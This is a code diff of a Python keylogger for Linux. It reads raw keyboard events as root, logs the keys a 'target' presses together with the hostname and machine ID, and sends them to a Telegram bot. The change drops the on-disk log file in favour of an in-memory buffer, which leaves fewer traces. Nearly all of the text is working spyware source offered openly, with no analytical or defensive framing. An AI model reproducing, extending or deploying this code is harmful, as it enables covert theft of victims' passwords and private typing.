@@ -8,17 +8,15 @@ import time
 import threading
 
 from telegramUtils import initChatID
-from telegramUtils import sendFromFile
+from telegramUtils import sendFromBuffer
 from telegramUtils import getLastMsg
 from telegramUtils import syncWithLatestUpdate
 
 wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
 debugging = 1       #get extra comments                                         (1/0)
-deletFile = 1       #do you want to delete the file at the start                (1/0)
 enableLocalKillSwitch = 1                                                     # (1/0)
-threshold = 10      #how many keys after sendFromFileing the text to the telegram bot   (int)
+threshold = 20      #how many keys after sendinf the text to the telegram bot   (int)
 
-LOG_FILE = 'keys.log'
 hostname = socket.gethostname()
 machine_id = uuid.getnode()
 EVENT_FORMAT = 'llHHI'
@@ -81,27 +79,25 @@ def FindKeyboardPath():
 def OpenDevice(path):
     return os.open(path, os.O_RDONLY | os.O_NONBLOCK)
 
-def decode_event(data):
+def decodeEvent(data):
     return struct.unpack(EVENT_FORMAT, data)
 
 def code2char(code):
     return KEYMAP.get(code, f"<{code}>")
-
-def WriteOnFile(c):
-    with open(LOG_FILE, 'a') as f:
-        f.write(c)
 
 def checkLocalKillSwitch():
     return 1 if os.path.isfile("/tmp/kill") else 0
 
 def saveKey(key):
     global contKeys
+    global log_buffer
+
     log_buffer.append(key)
-    WriteOnFile(key)
     contKeys = contKeys + 1
 
     if contKeys > threshold:
-        sendFromFile(LOG_FILE)
+        sendFromBuffer(log_buffer)
+        log_buffer = []
         contKeys = 0
 
 flagSHIFT = 0
@@ -120,7 +116,7 @@ def monitorShift(fd_shift):
             data = os.read(fd_shift, EVENT_SIZE)
             if len(data) < EVENT_SIZE:
                 continue
-            _, _, ev_type, code, value = decode_event(data)
+            _, _, ev_type, code, value = decodeEvent(data)
 
             if ev_type == 1 and code in (42, 54):  # left/right shift
                 with shift_lock:
@@ -159,7 +155,7 @@ def monitorKeys(fd):
             continue
         if len(data) < EVENT_SIZE:
             continue
-        sec, usec, ev_type, code, value = decode_event(data)
+        sec, usec, ev_type, code, value = decodeEvent(data)
 
         #reading the keyboard event
         if ev_type == 1:
@@ -176,7 +172,6 @@ def monitorKeys(fd):
 
             if value == 0 and code2char(code)=="[SHIFT]" and wantSHIFT:
                 log_buffer.append("[SHIFTUP]")
-                WriteOnFile("[SHIFT]UP")
 
 # THREAD KILL SWITCH
 
@@ -193,7 +188,6 @@ def chechRemoteKillSwitch():
 # MAIN
 
 def main():
-
     #check for root
     if os.geteuid() != 0:
         if debugging:
@@ -207,9 +201,6 @@ def main():
         if debugging:
             print(f"[!]Error: {e}", file=sys.stderr)
         sys.exit(1)
-
-    if debugging:
-        print(f"[+] saving keys on {LOG_FILE}")
     
     fd1 = OpenDevice(kbd_path)
     fd2 = OpenDevice(kbd_path)
@@ -236,21 +227,13 @@ def main():
 
 
 if __name__ == '__main__':
-
-    # delete LOG_FILE at the start
-    if os.path.isfile(LOG_FILE) and deletFile:  
-        try:
-            os.remove(LOG_FILE)
-        except OSError as e:
-            print(f"Error deleting log file '{LOG_FILE}': {e}")
-
     #start telegram bot
     initChatID()
     syncWithLatestUpdate()
 
     # starting messages
-    WriteOnFile("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id))
-    sendFromFile(LOG_FILE)
-    WriteOnFile("\nTEXT:\n")
+    log_buffer.append("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id) + "\nTEXT:\n")
+    sendFromBuffer(log_buffer)
+    log_buffer=[]
 
     main()
